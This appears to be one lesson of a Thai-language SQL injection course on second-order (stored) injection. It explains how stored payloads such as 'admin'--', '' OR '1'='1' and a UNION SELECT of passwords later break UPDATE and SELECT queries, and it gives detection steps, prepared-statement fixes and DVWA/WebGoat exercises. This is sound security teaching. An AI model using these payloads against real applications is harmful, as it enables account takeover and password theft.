# Part 025: Second-Order SQL Injection (Stored SQL Injection)

## ภาพรวม

Second-Order SQL Injection เป็นเทคนิคที่ซับซ้อนที่สุดในการตรวจจับ payload ถูก sanitize เมื่อ save แต่ถูกนำไปใช้ใน SQL query ภายหลังโดยไม่มีการ sanitize อีกครั้ง

**ขั้นตอนที่ 361-380**

---

## 361. หลักการ Second-Order Injection

### 61.1 Two-Phase Attack

```
Phase 1 (Data Storage):
User Input → Sanitization → Storage ใน Database
"admin'--" → "admin\'--" → บันทึกลง DB

Phase 2 (Data Retrieval and Use):
Database → ดึงข้อมูล → ใช้ใน SQL Query (ไม่ sanitize อีกครั้ง)
"admin'--" ← ดึงจาก DB ← ใช้ใน UPDATE query

Update Query:
UPDATE users SET email='new@email.com' WHERE username='admin'--'
↑ comment ทำให้ข้ามเงื่อนไข WHERE username ที่เหลือ
```

### 61.2 ทำไมถึงเกิดขึ้น?

```php
// Phase 1: Registration (secure)
$username = addslashes($_POST['username']);
$sql = "INSERT INTO users (username) VALUES ('$username')";
// บันทึก: admin\'--

// Phase 2: Profile update (vulnerable!)
$username = $_SESSION['username'];  // ดึงจาก DB: admin'--
$sql = "UPDATE users SET email='$email' WHERE username='$username'";
// Query: UPDATE users SET email='...' WHERE username='admin'--'
```

---

## 362. ตัวอย่าง Second-Order Scenarios

### 62.1 Scenario 1: Profile Update

```
Step 1: สมัคร user ด้วยชื่อ: admin'--
Step 2: ล็อกอินด้วยชื่อนั้น
Step 3: ไปที่ "Change Email" หรือ "Update Profile"
Step 4: ใส่ email ใหม่

Backend Code:
$username = $_SESSION['username'];  // ดึงจาก DB: admin'--
$sql = "UPDATE users SET email='$new_email' WHERE username='$username'";

Generated SQL:
UPDATE users SET email='attacker@evil.com' WHERE username='admin'--'
```

### 62.2 Scenario 2: Password Change

```
Step 1: สมัคร user ด้วยชื่อ: ' OR '1'='1
Step 2: ล็อกอิน
Step 3: เปลี่ยน password

Generated SQL:
UPDATE users SET password='hacked123' WHERE username='' OR '1'='1'
↑ เปลี่ยน password ของทุก user!
```

### 62.3 Scenario 3: Password Reset Bypass

```
Step 1: สมัคร username: admin'--
Step 2: Request password reset

Backend Code:
$sql = "SELECT email FROM users WHERE username='$username'";
// Query: SELECT email FROM users WHERE username='admin'--'
// → ดึง email ของ admin!
```

### 62.4 Scenario 4: Search Functionality

```
Step 1: บันทึก search query: ' UNION SELECT password FROM users--
Step 2: ใช้ search history ที่ reload saved query

Backend:
$sql = "SELECT * FROM products WHERE name LIKE '$saved_query'";
Generated: SELECT * FROM products WHERE name LIKE '' UNION SELECT password FROM users--'
```

---

## 363. การตรวจจับ Second-Order Injection

### 63.1 Black Box Detection

```
1. ระบุ input points ที่บันทึกข้อมูล:
   - Registration forms
   - Profile updates
   - Search history
   - Comments/Notes

2. ใส่ SQL payloads ใน input:
   admin'--
   admin' OR '1'='1
   ' UNION SELECT 1,2,3--

3. ใช้งาน feature ที่ใช้ข้อมูลที่บันทึก

4. สังเกต behavior ว่าเปลี่ยนแปลงหรือไม่
```

### 63.2 Source Code Review

```php
// VULNERABLE: นำข้อมูลจาก DB ไปใช้โดยตรง
$username = $db->query("SELECT username FROM users WHERE id=$id")->fetch()['username'];
$sql = "UPDATE profiles SET bio='$bio' WHERE username='$username'";

// SECURE: ใช้ Prepared Statements ทุกที่
$stmt = $db->prepare("UPDATE profiles SET bio=? WHERE username=?");
$stmt->execute([$bio, $username]);
```

---

## 364. Advanced Second-Order Techniques

### 64.1 Chained Second-Order

```
Step 1: บันทึก payload ใน field A
Step 2: Field A ถูกนำมาใช้ใน query B
Step 3: ผล query B ถูกนำมาใช้ใน query C
Step 4: SQL Injection เกิดที่ query C

ตัวอย่าง:
1. username = "' OR 1=1--"
2. SELECT role FROM users WHERE username='admin' OR 1=1--'
   → role = 'superadmin' (first row)
3. SELECT * FROM admin_panel WHERE role='superadmin'
   → เข้าถึง admin panel!
```

---

## 365. Prevention

```php
// Rule 1: ใช้ Prepared Statements ทุกที่ ไม่เว้นแม้ข้อมูลจาก DB

// BAD: ดึงจาก DB แล้วใช้โดยตรง
$username = $result['username'];
$sql = "UPDATE ... WHERE username='$username'";

// GOOD: ใช้ Prepared Statement เสมอ
$stmt = $pdo->prepare("UPDATE ... WHERE username=?");
$stmt->execute([$username]);

// Rule 2: ไม่ trust ข้อมูลใด ๆ ถึงแม้จะมาจาก DB ของตัวเอง
// Rule 3: Security review ทุก query ที่ใช้ข้อมูลที่บันทึกไว้
```

---

## 366. แบบฝึกหัด

### Exercise 1: Identify Second-Order Points

ใน DVWA หรือ WebGoat:
1. หา registration/profile forms
2. Register ด้วย username: `admin'--`
3. ล็อกอิน
4. ลอง update profile/change password
5. สังเกต SQL errors หรือ behavior ที่ผิดปกติ

### Exercise 2: Manual Code Review

```php
// Code A - vulnerable?
function updateProfile($conn, $userId, $newBio) {
    $user = $conn->query("SELECT username FROM users WHERE id=$userId")->fetch();
    $username = $user['username'];
    $stmt = $conn->query("UPDATE profiles SET bio='$newBio' WHERE username='$username'");
    return $stmt->rowCount();
}

// Code B - vulnerable?
function processOrder($conn, $customerId) {
    $customer = $conn->query("SELECT name FROM customers WHERE id=$customerId")->fetch();
    $stmt = $conn->prepare("INSERT INTO orders (customer) VALUES (?)");
    $stmt->execute([$customer['name']]);
}
```

---

## สรุป

Second-Order SQL Injection:

1. **Two-phase** - inject ใน phase 1, exploit ใน phase 2
2. **Harder to detect** - WAF และ code review อาจมองข้าม
3. **High impact** - มักส่งผลให้ privilege escalation
4. **Prevention** - Prepared Statements ทุกที่ ไม่ว่าข้อมูลจะมาจากไหน

---

*Part 025 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
